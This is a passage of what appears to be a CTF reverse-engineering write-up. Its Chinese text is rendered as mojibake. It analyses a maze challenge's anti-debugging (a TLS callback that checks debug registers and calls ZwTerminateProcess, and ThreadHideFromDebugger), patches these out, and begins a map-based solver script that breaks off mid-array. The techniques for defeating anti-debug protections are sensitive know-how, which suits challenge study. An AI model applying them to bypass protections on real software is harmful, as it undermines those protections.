class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       1,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>å¯å¾—ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sduwandus</span></span><br></pre></td></tr></table></figure><p>æ£€éªŒåå‘ç°ç»“æœé”™è¯¯</p><p>äºæ˜¯å°è¯•è°ƒè¯•çœ‹çœ‹å“ªé‡Œæœ‰é—®é¢˜</p><p>å…ˆæ£€æŸ¥äº†ä¸€ä¸‹åè°ƒè¯•ï¼Œå‘ç°æœ‰tls</p><p>æ‰“å¼€</p><p>å‘ç°tlsè¿˜åŸäº†ä¸€ä¸ªå‡½æ•°ï¼Œä¸çŸ¥é“è¿™ä¸ªå‡½æ•°åœ¨å“ªé‡Œè°ƒç”¨çš„</p><p><img src="https://s2.loli.net/2024/08/24/btP6WvqIp5zZidB.png" alt="image-20240824223727101"></p><p>æŸ¥æ‰¾èµ„æ–™æ˜¾ç¤ºï¼Œè¿™ä¸ªå‡½æ•°çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Context.Dr0 || Context.Dr1 || Context.Dr2 || Context.Dr3 )</span><br><span class="line">&#123;</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(HANDLE, _QWORD))ProcAddress)(CurrentProcess, <span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProcAddressä¸ºZwTerminateProcess</p><p>æ£€æŸ¥äº†æ˜¯å¦æœ‰æ–­ç‚¹å¯„å­˜å™¨çš„å€¼ï¼Œå¦‚æœæœ‰å°±ä¼šç›´æ¥é€€å‡º</p><blockquote><p>DR0-DR3:å­˜æ”¾æ–­ç‚¹å¯„å­˜å™¨<br>DR4-DR5:ä¿ç•™<br>DR6:çŠ¶æ€å¯„å­˜å™¨</p><p><a href="https://blog.csdn.net/Rong_Toa/article/details/118557609">è°ƒè¯•å¯„å­˜å™¨ï¼šDebug Register-CSDNåšå®¢</a></p></blockquote><p>åŒæ—¶è°ƒè¯•åˆ°è¿™é‡Œçš„æ—¶å€™ä¼šå‘ç°è¿™ä¸ªä¸æ˜¯ä¸»çº¿ç¨‹ï¼Œè€Œæ˜¯å…¶å®ƒçš„çº¿ç¨‹</p><p>è¿™ä¸ªçº¿ç¨‹å°±ä¼šåœ¨è¿™é‡Œä¸€ç›´å¾ªç¯æ¥åè°ƒè¯•</p><p>åŒæ—¶è¿™é‡Œçš„i!=jä¹Ÿå¾ˆå¥‡æ€ªä¸çŸ¥é“åˆ¤æ–­äº†ä»€ä¹ˆï¼Œiæ˜¯è¾“å…¥çš„ç¬¬å¤šå°‘ä½</p><p>åŒæ—¶ä»ä¸‹é¢å¾—åˆ°äº†å¦ä¸€å¼ åœ°å›¾map2_num</p><p>å°è¯•nopæ‰åè°ƒå†è°ƒä¸€æ¬¡</p><p>å‘ç°è¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ—¶å€™å·²ç»è¦æ±‚è¾“å…¥äº†</p><p><img src="https://s2.loli.net/2024/08/24/kIlKUJcgrHAC8dZ.png" alt="image-20240824231847577"></p><p>äºæ˜¯æŸ¥æ‰¾äº¤å‰å¼•ç”¨ï¼Œå‘ç°__scrt_common_main_seh()ä¸­çš„</p><p>initterm_e((_PIFV *)&amp;First, (_PIFV *)&amp;Last)è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</p><p>initterm_eéå†äº†åœ°å€ä»firståˆ°lastæ‰§è¡Œäº†å…¶ä¸­æ‰€æœ‰å‡½æ•°</p><p>ä¼¼ä¹ç³»ç»Ÿè®¤ä¸ºè¿™ä¸ªæ˜¯åˆå§‹åŒ–å‡½æ•°ï¼Ÿï¼Ÿ</p><p>è¿™é‡Œä¸€å…±æœ‰ä¸¤ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºç¬¬äºŒä¸ªæ‰§è¡Œåˆå§‹åŒ–ï¼Œè§£å¯†å­—ç¬¦ä¸²</p><p><img src="https://s2.loli.net/2024/08/24/NuxvF3bQezlrfJK.png" alt="image-20240824234314235"></p><p>æœ€åæ‰§è¡Œäº†ZwSetInformationThreadå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS <span class="title function_">ZwSetInformationThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE          ThreadHandle,</span></span><br><span class="line"><span class="params">  [in] THREADINFOCLASS ThreadInformationClass,</span></span><br><span class="line"><span class="params">  [in] PVOID           ThreadInformation,</span></span><br><span class="line"><span class="params">  [in] ULONG           ThreadInformationLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬äºŒä¸ªThreadInformationClassä¼ å…¥çš„æ˜¯17</p><p>å¯¹åº”çš„0x11æ ‡å¿—æ˜¯ï¼šThreadHideFromDebugger</p><p>[<a href="https://bbs.kanxue.com/thread-249689.htm">åŸåˆ›]è°ƒè¯•é™·é˜±ThreadHideFromDebuggerçš„å¦ä¸€ç§å¯¹æŠ—æ–¹æ³•-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>æ ¹æ®è¿™ä¸ªæ–‡ç« ï¼Œå¯ä»¥çœ‹åˆ°æ•ˆæœæ˜¯ä½¿è°ƒè¯•å™¨æ¥æ”¶ä¸åˆ°è°ƒè¯•ä¿¡æ¯<br>ç„¶åè°ƒè¯•å°±ä¼šå¯„æ‰</p><p>è¿™é‡Œåªéœ€è¦è·³è¿‡æœ€åä¸€è¡Œä»£ç å³å¯è¿›å…¥mainå‡½æ•°ä¸­ï¼Œä¸ºäº†åé¢è°ƒè¯•æ–¹ä¾¿ï¼Œç»§ç»­patch</p><p>ç„¶åå†å›åˆ°ä¸»å‡½æ•°ï¼Œifé‡Œé¢æœ‰ä¸ªsleepæ„Ÿè§‰æ˜¯ä¸ºäº†æ¯è½®å¼€å§‹æ—¶ç»™é‚£ä¸ªæ£€æŸ¥å‡½æ•°è¶³å¤Ÿçš„æ—¶é—´å»æ£€æŸ¥çš„</p><p>å¦‚æœæ˜¯åœ°å›¾æœ‰é—®é¢˜é‚£ä¹ˆoffæŒ‡å‘çš„ä¸œè¥¿è‚¯å®šä¼šå˜ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªç¡¬ä»¶å†™å…¥æ–­ç‚¹</p><p>ç¬¬ä¸€ä¸ªå¾ªç¯å®Œï¼Œæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åˆ°sleep(0x28)çš„æ—¶å€™ï¼Œæ–­ç‚¹è¢«å†™å…¥ï¼Œå¿½ç„¶è·³åˆ°äº†ç¬¬5ä¸ªçº¿ç¨‹</p><p><img src="https://s2.loli.net/2024/08/25/JADyt2mG9YVSbdn.png" alt="image-20240825000637454"></p><p>è¿™æ—¶å› ä¸ºsleepå‡½æ•°ä¼šå°†å½“å‰çº¿ç¨‹æš‚æ—¶æŒ‚èµ·è®©cpuå»æ‰§è¡Œå…¶å®ƒçº¿ç¨‹</p><p>åœ¨è¿™é‡Œå®ƒæŠŠqwordæ•°ç»„çš„ç¬¬-8ä½å†™å…¥äº†v2</p><p><img src="https://s2.loli.net/2024/08/25/aOwyM87qhuj2fL5.png" alt="image-20240825000825078"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±çŸ¥é“ï¼Œå®ƒåœ¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹æ£€æŸ¥äº†ä¸€ä¸ªä¸œè¥¿ï¼Œç„¶åå†™å…¥è¿™ä¸€è½®(æŒ‰1ä¸ªå­—ç¬¦ç®—ä¸€è½®)çš„åœ°å›¾ã€‚åˆ¤æ–­ä¾æ®æ˜¯ä»€ä¹ˆå‘¢</p><p><img src="https://s2.loli.net/2024/08/25/DNwxstMihH7KEdW.png" alt="image-20240825001138474"></p><p>å¾ˆæ˜æ˜¾è¿™é‡Œå†™å…¥çš„æ˜¯v2çš„å€¼ï¼Œv2çš„å€¼æ ¹æ®v1æ¥å˜åŒ–ï¼Œv1æ ¹æ®test_numæ¥å˜åŒ–ï¼ŒåŒæ—¶ä¹Ÿå’Œiï¼Œjæœ‰å…³</p><p>testnumæ¯æ¬¡å’Œ1æ¯”è¾ƒåŒæ—¶æ¯æ¬¡éƒ½ä¼šè¢«v1èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€è½®çš„test_numéƒ½æ˜¯ä¸Šä¸€è½®çš„v1å¾—åˆ°çš„ï¼Œç”±äºv1ä¸ºå±€éƒ¨å˜é‡ï¼Œä¸€å¼€å§‹ä¸º0ï¼Œæ‰€ä»¥test_numä¸€å®šä¼šæ˜¯1ï¼Œ2ï¼Œ1ï¼Œ2äº¤æ›¿</p><p>æ‰“ä¸Šæ–­ç‚¹<br>å‘ç°test_numå®ƒåªåœ¨è¿™é‡Œè¢«èµ‹å€¼ã€‚</p><p>ç„¶åç»™iå’Œjæ‰“æ–­ç‚¹</p><p>è°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œç”±äºiä¸€ç›´åœ¨mainé‡Œé¢å¢åŠ ï¼Œæ‰€ä»¥ä¸€æ—¦åˆ°æ–°çš„ä¸€è½®ï¼Œè¿™é‡Œå°±ä¼šè§¦å‘ï¼Œè®©j++ï¼Œç„¶åä¿®æ”¹v1ï¼Œèµ‹å€¼</p><p>è‡³æ­¤ï¼Œå®ƒçš„é€»è¾‘åº”è¯¥æ˜¯ï¼šç¬¬ä¸€è½®ç”¨map1ï¼Œç¬¬äºŒè½®ç”¨map2ï¼Œç¬¬ä¸‰è½®ç”¨map1â€¦</p><p>ç„¶åå°±ç›´æ¥å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">map1 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, 